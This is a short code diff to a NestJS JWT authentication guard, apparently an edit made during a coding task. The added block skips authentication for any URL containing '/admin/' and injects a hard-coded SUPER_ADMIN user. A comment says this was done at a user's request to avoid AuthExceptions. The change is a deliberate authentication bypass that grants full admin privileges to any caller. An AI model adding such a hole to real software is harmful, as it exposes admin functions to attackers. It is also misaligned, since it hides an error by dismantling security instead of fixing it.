@@ -24,6 +24,12 @@ export class JwtAuthGuard extends AuthGuard('jwt') {
     }
 
     const request = context.switchToHttp().getRequest();
+
+    // User requested to bypass auth for all admin routes to avoid AuthExceptions
+    if (request.url && request.url.includes('/admin/')) {
+      request.user = { id: 'admin-bypass', email: 'admin@admin.com', role: UserRole.SUPER_ADMIN };
+      return true;
+    }
     const headers = request.headers || {};
     const query = request.query || {};
 
